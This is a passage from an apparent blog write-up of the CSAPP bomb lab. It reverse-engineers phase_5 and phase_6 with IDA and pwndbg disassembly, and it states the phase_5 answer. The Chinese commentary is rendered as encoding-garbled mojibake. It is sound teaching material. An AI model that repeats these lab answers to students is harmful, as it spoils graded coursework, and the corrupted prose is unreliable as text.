you?&quot;</span></span><br><span class="line"></span><br><span class="line">æˆ–åœ¨IDAä¸­å»çœ‹è¿™æ®µæ•°æ®ï¼š</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>0 array_3449      db <span class="number">6</span>Dh                  ; DATA XREF: phase_5+<span class="number">37</span>â†‘r</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>1                 db  <span class="number">61</span>h ; a</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>2                 db  <span class="number">64</span>h ; d</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>3                 db  <span class="number">75</span>h ; u</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>4                 db  <span class="number">69</span>h ; i</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>5                 db  <span class="number">65</span>h ; e</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>6                 db  <span class="number">72</span>h ; r</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>7                 db  <span class="number">73</span>h ; s</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>8                 db  <span class="number">6</span>Eh ; n</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>9                 db  <span class="number">66</span>h ; f</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>A                 db  <span class="number">6F</span>h ; o</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>B                 db  <span class="number">74</span>h ; t</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>C                 db  <span class="number">76</span>h ; v</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>D                 db  <span class="number">62</span>h ; b</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>E                 db  <span class="number">79</span>h ; y</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>F                 db  <span class="number">6</span>Ch ; l</span><br><span class="line">.rodata:<span class="number">00000000004024</span>C0 ; <span class="type">const</span> <span class="type">char</span> aSoYouThinkYouC[]</span><br><span class="line">.rodata:<span class="number">00000000004024</span>C0 aSoYouThinkYouC db <span class="string">&#x27;So you think you can stop the bomb with ctrl-c, do you?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004024</span>C0                                         ; DATA XREF: sig_handler+<span class="number">4</span>â†‘o</span><br><span class="line">.rodata:<span class="number">00000000004024F</span>8 ; <span class="type">const</span> <span class="type">char</span> aCursesYouVeFou[]</span><br><span class="line">.rodata:<span class="number">00000000004024F</span>8 aCursesYouVeFou db <span class="string">&#x27;Curses, you&#x27;</span>,<span class="number">27</span>h,<span class="string">&#x27;ve found the secret phase!&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004024F</span>8                                         ; DATA XREF: phase_defused+<span class="number">53</span>â†‘o</span><br></pre></td></tr></table></figure><p>çœ‹åæ±‡ç¼–ä»£ç æ—¶å¯å‚è€ƒIDAç”Ÿæˆçš„æŒ‡ä»¤æµå›¾ï¼š</p><p><img src="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/Untitled.png" alt="Untitled"></p><p>ç¨‹åºæ„å›¾ä¸ºï¼šè¯»å–ä¸€ä¸ªé•¿åº¦ä¸º6çš„å­—ç¬¦ä¸²ï¼Œå¯¹äºæ¯ä¸ªå­—ç¬¦æˆªå–åå››ä½æ•°å­—ï¼Œç”¨æ¥ä½œä¸ºindexè·å–å¦ä¸€ä¸ªå­—ç¬¦ä¸²é‡Œå¯¹åº”çš„å­—ç¬¦ï¼Œå¹¶ä¿å­˜èµ·æ¥ï¼Œäº§ç”Ÿä¸€ä¸ªæ–°çš„é•¿åº¦ä¸º6çš„å­—ç¬¦ä¸²ï¼Œè¦æ±‚ç­‰äºå¦ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>æ ¹æ®IDAä¸­.rodataä¸­0x4024b0å¤„æ•°æ®å¯ä»¥ç›´è§‚çœ‹åˆ°ï¼šâ€flyersâ€å„å­—ç¬¦åœ¨0x4024b0å­—ç¬¦ä¸²ä¸­åˆ†åˆ«ç”±ç´¢å¼•<code>9FE567</code> è·å¾—ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²å4ä½éœ€åˆ†åˆ«ä¸ºè¿™äº›æ•°ã€‚å‚è€ƒASCIIè¡¨ï¼š</p><p><img src="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/Untitled%201.png" alt="Untitled"></p><p>å¯æ„é€ å‡ºè¾“å…¥ï¼š<code>9?&gt;567</code></p><hr><p>å‰æ’æç¤ºï¼šphase_6 å’Œ secret_phase éš¾åº¦ç¨å¤§ï¼Œæƒ³é€Ÿé€šçš„ç©å®¶å¯ä»¥å…ˆè·³è¿‡ã€‚</p><h1 id="phase-6">phase_6</h1><p>å¯¹äºæ¶‰åŠå¤æ‚æ•°æ®ç»“æ„çš„ç¨‹åºï¼ŒIDAçš„åç¼–è¯‘ç»“æœå¯è¯»æ€§ä¸ä½³ï¼ˆåç¼–è¯‘ä»£ç ç”šè‡³æ¯”åæ±‡ç¼–è¿˜é•¿ï¼‰ï¼Œè¿™é‡Œä¸å¦¨å…ˆçœ‹çœ‹åæ±‡ç¼–çš„ç»“æœï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble phase_6</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function phase_6:</span><br><span class="line">   <span class="number">0x00000000004010f4</span> &lt;+<span class="number">0</span>&gt;:     push   r14</span><br><span class="line">   <span class="number">0x00000000004010f6</span> &lt;+<span class="number">2</span>&gt;:     push   r13</span><br><span class="line">   <span class="number">0x00000000004010f8</span> &lt;+<span class="number">4</span>&gt;:     push   r12</span><br><span class="line">   <span class="number">0x00000000004010fa</span> &lt;+<span class="number">6</span>&gt;:     push   rbp</span><br><span class="line">   <span class="number">0x00000000004010fb</span> &lt;+<span class="number">7</span>&gt;:     push   rbx</span><br><span class="line">   <span class="number">0x00000000004010fc</span> &lt;+<span class="number">8</span>&gt;:     sub    rsp,<span class="number">0x50</span></span><br><span class="line">   <span class="number">0x0000000000401100</span> &lt;+<span class="number">12</span>&gt;:    mov    r13,rsp</span><br><span class="line">   <span class="number">0x0000000000401103</span> &lt;+<span class="number">15</span>&gt;:    mov    rsi,rsp</span><br><span class="line">   <span class="number">0x0000000000401106</span> &lt;+<span class="number">18</span>&gt;:    call   <span class="number">0x40145c</span> &lt;read_six_numbers&gt;  <span class="comment">// 6ä¸ªè¾“å…¥æ•°å­—è¯»åœ¨rspä½ç½®</span></span><br><span class="line">---------------------------- å¤–å±‚ <span class="keyword">for</span></span><br><span class="line">   <span class="number">0x000000000040110b</span> &lt;+<span class="number">23</span>&gt;:    mov    r14,rsp</span><br><span class="line">   <span class="number">0x000000000040110e</span> &lt;+<span class="number">26</span>&gt;:    mov    r12d,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401114</span> &lt;+<span class="number">32</span>&gt;:    mov    rbp,r13</span><br><span class="line">   <span class="number">0x0000000000401117</span> &lt;+<span class="number">35</span>&gt;:    mov    eax,DWORD PTR [r13+<span class="number">0x0</span>] ; rbp,r14,r13éƒ½ç­‰äºrsp, rsiåœ¨è¿›å…¥readå‡½æ•°åè¢«æ”¹</span><br><span class="line">   <span class="number">0x000000000040111b</span> &lt;+<span class="number">39</span>&gt;:    sub    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040111e</span> &lt;+<span class="number">42</span>&gt;:    cmp    eax,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x0000000000401121</span> &lt;+<span class="number">45</span>&gt;:    jbe    <span class="number">0x401128</span> &lt;phase_6+<span class="number">52</span>&gt; ; <span class="number">6</span>ä¸ªå…ƒç´ éƒ½: <span class="number">-1</span>åå°äºç­‰äº<span class="number">5</span></span><br><span class="line">   <span class="number">0x0000000000401123</span> &lt;+<span class="number">47</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401128</span> &lt;+<span class="number">52</span>&gt;:    add    r12d,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040112c</span> &lt;+<span class="number">56</span>&gt;:    cmp    r12d,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x0000000000401130</span> &lt;+<span class="number">60</span>&gt;:    je     <span class="number">0x401153</span> &lt;phase_6+<span class="number">95</span>&gt;</span><br><span class="line">---------------------------- å†…å±‚ <span class="keyword">for</span></span><br><span class="line">   <span class="number">0x0000000000401132</span> &lt;+<span class="number">62</span>&gt;:    mov    ebx,r12d</span><br><span class="line">   <span class="number">0x0000000000401135</span> &lt;+<span class="number">65</span>&gt;:    movsxd rax,ebx</span><br><span class="line">   <span class="number">0x0000000000401138</span> &lt;+<span class="number">68</span>&gt;:    mov    eax,DWORD PTR [rsp+rax*<span class="number">4</span>]</span><br><span class="line">   <span class="number">0x000000000040113b</span> &lt;+<span class="number">71</span>&gt;:    cmp    DWORD PTR [rbp+<span class="number">0x0</span>],eax</span><br><span class="line">   <span class="number">0x000000000040113e</span> &lt;+<span class="number">74</span>&gt;:    jne    <span class="number">0x401145</span> &lt;phase_6+<span class="number">81</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401140</span> &lt;+<span class="number">76</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401145</span> &lt;+<span class="number">81</span>&gt;:    add    ebx,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0000000000401148</span> &lt;+<span class="number">84</span>&gt;:    cmp    ebx,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x000000000040114b</span> &lt;+<span class="number">87</span>&gt;:    jle    <span class="number">0x401135</span> &lt;phase_6+<span class="number">65</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040114d</span> &lt;+<span class="number">89</span>&gt;:    add    r13,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x0000000000401151</span> &lt;+<span class="number">93</span>&gt;:    jmp    <span class="number">0x401114</span> &lt;phase_6+<span class="number">32</span>&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x0000000000401153</span> &lt;+<span class="number">95</span>&gt;:    lea    rsi,[rsp+<span class="number">0x18</span>]  ; è¾“å…¥çš„ç»“å°¾\<span class="number">0</span></span><br><span class="line">   <span class="number">0x0000000000401158</span> &lt;+<span class="number">100</span>&gt;:   mov    rax,r14</span><br><span class="line">   <span class="number">0x000000000040115b</span> &lt;+<span class="number">103</span>&gt;:   mov    ecx,<span class="number">0x7</span></span><br><span class="line">   <span class="number">0x0000000000401160</span> &lt;+<span class="number">108</span>&gt;:   mov    edx,ecx</span><br><span class="line">   <span class="number">0x0000000000401162</span> &lt;+<span class="number">110</span>&gt;:   sub    edx,DWORD PTR [rax]</span><br><span class="line">   <span class="number">0x0000000000401164</span> &lt;+<span class="number">112</span>&gt;:   mov    DWORD PTR [rax],edx</span><br><span class="line">   <span class="number">0x0000000000401166</span> &lt;+<span class="number">114</span>&gt;:   add    rax,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x000000000040116a</span> &lt;+<span class="number">118</span>&gt;:   cmp    rax,rsi</span><br><span class="line">   <span class="number">0x000000000040116d</span> &lt;+<span class="number">121</span>&gt;:   jne    <span class="number">0x401160</span> &lt;phase_6+<span class="number">108</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040116f</span> &lt;+<span class="number">123</span>&gt;:   mov    esi,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401174</span> &lt;+<span class="number">128</span>&gt;:   jmp    <span class="number">0x401197</span> &lt;phase_6+<span class="number">163</span>&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x0000000000401176</span> &lt;+<span class="number">130</span>&gt;:   mov    rdx,QWORD PTR [rdx+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x000000000040117a</span> &lt;+<span class="number">134</span>&gt;:   add    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040117d</span> &lt;+<span class="number">137</span>&gt;:   cmp    eax,ecx</span><br><span class="line">   <span class="number">0x000000000040117f</span> &lt;+<span class="number">139</span>&gt;:   jne    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401181</span> &lt;+<span class="number">141</span>&gt;:   jmp    <span class="number">0x401188</span> &lt;phase_6+<span class="number">148</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401183</span> &lt;+<span class="number">143</span>&gt;:   mov    edx,<span class="number">0x6032d0</span></span><br><span class="line">   <span class="number">0x0000000000401188</span> &lt;+<span class="number">148</span>&gt;:   mov    QWORD PTR [rsp+rsi*<span class="number">2</span>+<span class="number">0x20</span>],rdx</span><br><span class="line">   <span class="number">0x000000000040118d</span> &lt;+<span class="number">153</span>&gt;:   add    rsi,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x0000000000401191</span> &lt;+<span class="number">157</span>&gt;:   cmp    rsi,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x0000000000401195</span> &lt;+<span class="number">161</span>&gt;:   je     <span class="number">0x4011ab</span> &lt;phase_6+<span class="number">183</span>&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x0000000000401197</span> &lt;+<span class="number">163</span>&gt;:   mov    ecx,DWORD PTR [rsp+rsi*<span class="number">1</span>]</span><br><span class="line">   <span class="number">0x000000000040119a</span> &lt;+<span class="number">166</span>&gt;:   cmp    ecx,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040119d</span> &lt;+<span class="number">169</span>&gt;:   jle    <span class="number">0x401183</span> &lt;phase_6+<span class="number">143</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040119f</span> &lt;+<span class="number">171</span>&gt;:   mov    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004011a4</span> &lt;+<span class="number">176</span>&gt;:   mov    edx,<span class="number">0x6032d0</span></span><br><span class="line">   <span class="number">0x00000000004011a9</span> &lt;+<span class="number">181</span>&gt;:   jmp    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x00000000004011ab</span> &lt;+<span class="number">183</span>&gt;:   mov    rbx,QWORD PTR [rsp+<span class="number">0x20</span>]</span><br><span class="line">   <span class="number">0x00000000004011b0</span> &lt;+<span class="number">188</span>&gt;:   lea    rax,[rsp+<span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x00000000004011b5</span> &lt;+<span class="number">193</span>&gt;:   lea    rsi,[rsp+<span class="number">0x50</span>]</span><br><span class="line">   <span class="number">0x00000000004011ba</span> &lt;+<span class="number">198</span>&gt;:   mov    rcx,rbx</span><br><span class="line">   <span class="number">0x00000000004011bd</span> &lt;+<span class="number">201</span>&gt;:   mov    rdx,QWORD PTR [rax]</span><br><span class="line">   <span class="number">0x00000000004011c0</span> &lt;+<span class="number">204</span>&gt;:   mov    QWORD PTR [rcx+<span class="number">0x8</span>],rdx</span><br><span class="line">   <span class="number">0x00000000004011c4</span> &lt;+<span class="number">208</span>&gt;:   add    rax,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x00000000004011c8</span> &lt;+<span class="number">212</span>&gt;:   cmp    rax,rsi</span><br><span class="line">   <span class="number">0x00000000004011cb</span> &lt;+<span class="number">215</span>&gt;:   je     <span class="number">0x4011d2</span> &lt;phase_6+<span class="number">222</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004011cd</span> &lt;+<span class="number">217</span>&gt;:   mov    rcx,rdx</span><br><span class="line">   <span class="number">0x00000000004011d0</span> &lt;+<span class="number">220</span>&gt;:   jmp    <span class="number">0x4011bd</span> &lt;phase_6+<span class="number">201</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004011d2</span> &lt;+<span class="number">222</span>&gt;:   mov    QWORD PTR [rdx+<span class="number">0x8</span>],<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">   <span class="number">0x00000000004011da</span> &lt;+<span class="number">230</span>&gt;:   mov    ebp,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x00000000004011df</span> &lt;+<span class="number">235</span>&gt;:   mov    rax,QWORD PTR [rbx+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x00000000004011e3</span> &lt;+<span class="number">239</span>&gt;:   mov    eax,DWORD PTR [rax]</span><br><span class="line">   <span class="number">0x00000000004011e5</span> &lt;+<span class="number">241</span>&gt;:   cmp    DWORD PTR [rbx],eax</span><br><span class="line">   <span class="number">0x00000000004011e7</span> &lt;+<span class="number">243</span>&gt;:   jge    <span class="number">0x4011ee</span> &lt;phase_6+<span class="number">250</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004011e9</span> &lt;+<span class="number">245</span>&gt;:   call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x00000000004011ee</span> &lt;+<span class="number">250</span>&gt;:   mov    rbx,QWORD PTR [rbx+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x00000000004011f2</span> &lt;+<span class="number">254</span>&gt;:   sub    ebp,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004011f5</span> &lt;+<span class="number">257</span>&gt;:   jne    <span class="number">0x4011df</span> &lt;phase_6+<span class="number">235</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004011f7</span> &lt;+<span class="number">259</span>&gt;:   add    rsp,<span class="number">0x50</span></span><br><span class="line">   <span class="number">0x00000000004011fb</span> &lt;+<span class="number">263</span>&gt;:   pop    rbx</span><br><span class="line">   <span class="number">0x00000000004011fc</span> &lt;+<span class="number">264</span>&gt;:   pop    rbp</span><br><span class="line">   <span class="number">0x00000000004011fd</span> &lt;+<span class="number">265</span>&gt;:   pop    r12</span><br><span class="line">   <span class="number">0x00000000004011ff</span> &lt;+<span class="number">267</span>&gt;:   pop    r13</span><br><span class="line">   <span class="number">0x0000000000401201</span> &lt;+<span class="number">269</span>&gt;:   pop    r14</span><br><span class="line">   <span class="number">0x0000000000401203</span> &lt;+<span class="number">271</span>&gt;:   ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><hr><p>å¤ªå¤æ‚äº†ï¼ŒåŒ–æ•´ä¸ºé›¶ï¼Œä¸€æ­¥æ­¥æ¥</p><h2 id="Part-6-1-é¢„æ£€æµ‹">Part 6.1 é¢„æ£€æµ‹</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x00000000004010f4</span> &lt;+<span class="number">0</span>&gt;:     push   r14</span><br><span class="line">   <span class="number">0x00000000004010f6</span> &lt;+<span class="number">2</span>&gt;:     push   r13</span><br><span class="line">   <span class="number">0x00000000004010f8</span> &lt;+<span class="number">4</span>&gt;:     push   r12</span><br><span class="line">   <span class="number">0x00000000004010fa</span> &lt;+<span class="number">6</span>&gt;:     push   rbp</span><br><span class="line">   <span class="number">0x00000000004010fb</span> &lt;+<span class="number">7</span>&gt;:     push   rbx</span><br><span class="line">   <span class="number">0x00000000004010fc</span> &lt;+<span class="number">8</span>&gt;:     sub    rsp,<span class="number">0x50</span></span><br><span class="line">   <span class="number">0x0000000000401100</span> &lt;+<span class="number">12</span>&gt;:    mov    r13,rsp</span><br><span class="line">   <span class="number">0x0000000000401103</span> &lt;+<span class="number">15</span>&gt;:    mov    rsi,rsp</span><br><span class="line">   <span class="number">0x0000000000401106</span> &lt;+<span class="number">18</span>&gt;:    call   <span class="number">0x40145c</span> &lt;read_six_numbers&gt;  ; <span class="number">6</span>ä¸ªè¾“å…¥æ•°å­—è¯»åœ¨rsp, rsiåœ¨è¿›å…¥readå‡½æ•°åè¢«æ”¹</span><br><span class="line">---------------------------- å¤–å±‚<span class="keyword">for</span>, ç´¢å¼•ä¸ºr12</span><br><span class="line">   <span class="number">0x000000000040110b</span> &lt;+<span class="number">23</span>&gt;:    mov    r14,rsp</span><br><span class="line">   <span class="number">0x000000000040110e</span> &lt;+<span class="number">26</span>&gt;:    mov    r12d,<span class="number">0x0</span>  ; r12åˆå§‹åŒ–ä¸º<span class="number">0</span></span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401114</span> &lt;+<span class="number">32</span>&gt;:    mov    rbp,r13</span><br><span class="line">   <span class="number">0x0000000000401117</span> &lt;+<span class="number">35</span>&gt;:    mov    eax,DWORD PTR [r13+<span class="number">0x0</span>]  ; rbp,r14,r13éƒ½ç­‰äºrsp</span><br><span class="line">   <span class="number">0x000000000040111b</span> &lt;+<span class="number">39</span>&gt;:    sub    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040111e</span> &lt;+<span class="number">42</span>&gt;:    cmp    eax,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x0000000000401121</span> &lt;+<span class="number">45</span>&gt;:    jbe    <span class="number">0x401128</span> &lt;phase_6+<span class="number">52</span>&gt;  ; <span class="number">6</span>ä¸ªå…ƒç´ éƒ½: <span class="number">-1</span>åå°äºç­‰äº<span class="number">5</span></span><br><span class="line">   <span class="number">0x0000000000401123</span> &lt;+<span class="number">47</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401128</span> &lt;+<span class="number">52</span>&gt;:    add    r12d,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040112c</span> &lt;+<span class="number">56</span>&gt;:    cmp    r12d,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x0000000000401130</span> &lt;+<span class="number">60</span>&gt;:    je     <span class="number">0x401153</span> &lt;phase_6+<span class="number">95</span>&gt;</span><br><span class="line">---------------------------- å†…å±‚<span class="keyword">for</span>, ç´¢å¼•ä¸ºebx</span><br><span class="line">   <span class="number">0x0000000000401132</span> &lt;+<span class="number">62</span>&gt;:    mov    ebx,r12d</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401135</span> &lt;+<span class="number">65</span>&gt;:    movsxd rax,ebx  ; rax = r12 = i</span><br><span class="line">   <span class="number">0x0000000000401138</span> &lt;+<span class="number">68</span>&gt;:    mov    eax,DWORD PTR [rsp+rax*<span class="number">4</span>]</span><br><span class="line">   <span class="number">0x000000000040113b</span> &lt;+<span class="number">71</span>&gt;:    cmp    DWORD PTR [rbp+<span class="number">0x0</span>],eax ; rbpæŒ‡å‘rsp, è¾“å…¥ç¬¬<span class="number">1</span>ä¸ªå…ƒç´ </span><br><span class="line">   <span class="number">0x000000000040113e</span> &lt;+<span class="number">74</span>&gt;:    jne    <span class="number">0x401145</span> &lt;phase_6+<span class="number">81</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401140</span> &lt;+<span class="number">76</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401145</span> &lt;+<span class="number">81</span>&gt;:    add    ebx,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0000000000401148</span> &lt;+<span class="number">84</span>&gt;:    cmp    ebx,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x000000000040114b</span> &lt;+<span class="number">87</span>&gt;:    jle    <span class="number">0x401135</span> &lt;phase_6+<span class="number">65</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040114d</span> &lt;+<span class="number">89</span>&gt;:    add    r13,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x0000000000401151</span> &lt;+<span class="number">93</span>&gt;:    jmp    <span class="number">0x401114</span> &lt;phase_6+<span class="number">32</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_6</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> *v1; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// er12</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD *v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 j; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// ebp</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v15[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+18h] [rbp-60h] BYREF 18hå°±æ˜¯24lï¼Œä¹Ÿå°±æ˜¯è¾“å…¥å­—ç¬¦ä¸²ç»“å°¾\0çš„ä½ç½®                  </span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [rsp+28h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v19[<span class="number">40</span>]; <span class="comment">// [rsp+50h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v1 = v15;</span><br><span class="line">  <span class="built_in">read_six_numbers</span>(a1, (__int64)v15);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span 